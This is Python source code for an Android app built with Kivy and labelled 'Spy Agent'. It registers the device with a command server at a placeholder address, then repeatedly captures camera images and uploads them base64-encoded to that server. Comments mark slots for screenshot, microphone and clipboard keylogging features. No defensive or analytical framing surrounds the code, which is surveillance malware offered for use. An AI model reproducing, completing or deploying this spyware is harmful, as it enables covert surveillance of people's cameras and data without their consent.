"""
Android service entry point – runs the spy agent as a background service.
"""
import os
import sys
import threading
import time
import json
import socket
import uuid
import platform
import subprocess
import logging
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.core.window import Window

# Import your agent modules
try:
    from agent import main_loop
except ImportError:
    # Fallback – define main_loop inline
    def main_loop():
        import requests
        import cv2
        import numpy as np
        from PIL import Image, ImageGrab
        import io
        import base64
        import queue
        
        SERVER_URL = "http://YOUR_SERVER_IP:5000"
        hostname = socket.gethostname()
        agent_id = hostname + '-' + str(uuid.uuid4())[:8]
        
        def register():
            info = {
                'hostname': hostname,
                'os': 'Android',
                'user': os.getenv('USER', 'unknown'),
                'arch': platform.machine()
            }
            try:
                r = requests.post(f"{SERVER_URL}/api/register", 
                                 json={'id': agent_id, 'info': info}, timeout=10)
                return r.status_code == 200
            except:
                return False
        
        def send_log(log_type, data):
            try:
                requests.post(f"{SERVER_URL}/api/log", 
                             json={'agent_id': agent_id, 'type': log_type, 'data': data[:2000]}, timeout=10)
            except:
                pass
        
        def send_media(media_type, data_bytes):
            try:
                b64 = base64.b64encode(data_bytes).decode('utf-8')
                requests.post(f"{SERVER_URL}/api/media", 
                             json={'agent_id': agent_id, 'type': media_type, 'data': b64}, timeout=10)
            except:
                pass
        
        register()
        while True:
            try:
                # Camera (Android camera via OpenCV)
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    _, buf = cv2.imencode('.jpg', frame)
                    send_media('image', buf.tobytes())
                
                # Screenshot (requires root on Android – skip)
                # Microphone (Android mic via pyaudio)
                # Keylogger (Android clipboard monitoring)
                
                time.sleep(120)
            except:
                pass

class SpyService(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.running = True

    def run(self):
        # Your agent logic here
        while self.running:
            try:
                main_loop()
            except Exception as e:
                print(f"Service error: {e}")
                time.sleep(10)

class SpyApp(App):
    def build(self):
        # Set background color
        Window.clearcolor = (0.1, 0.1, 0.1, 1)
        
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # Title
        title = Label(text='🕵️ Spy Agent', font_size='24sp', color=(0, 1, 0, 1))
        layout.add_widget(title)
        
        # Status
        self.status_label = Label(text='[ Starting... ]', font_size='16sp', color=(1, 1, 1, 1))
        layout.add_widget(self.status_label)
        
        # Start button
        start_btn = Button(text='▶ Start Service', size_hint=(1, 0.2))
        start_btn.bind(on_press=self.start_service)
        layout.add_widget(start_btn)
        
        # Stop button
        stop_btn = Button(text='■ Stop Service', size_hint=(1, 0.2))
        stop_btn.bind(on_press=self.stop_service)
        layout.add_widget(stop_btn)
        
        # Log area (simple)
        self.log_label = Label(text='Logs will appear here...', font_size='12sp', 
                              color=(0.8, 0.8, 0.8, 1), halign='left', valign='top')
        self.log_label.bind(size=self.log_label.setter('text_size'))
        layout.add_widget(self.log_label)
        
        self.service = None
        self.status_label.text = '[ Stopped ]'
        
        return layout

    def start_service(self, instance):
        if self.service is None or not self.service.is_alive():
            self.service = SpyService()
            self.service.start()
            self.status_label.text = '[ Running ]'
            self.log_label.text += '\nService started.'
            # Start periodic log updates
            Clock.schedule_interval(self.update_log, 5)

    def stop_service(self, instance):
        if self.service:
            self.service.running = False
            self.service = None
            self.status_label.text = '[ Stopped ]'
            self.log_label.text += '\nService stopped.'
            Clock.unschedule(self.update_log)

    def update_log(self, dt):
        self.log_label.text += f'\n{time.ctime()} - Running...'

if __name__ == '__main__':
    SpyApp().run()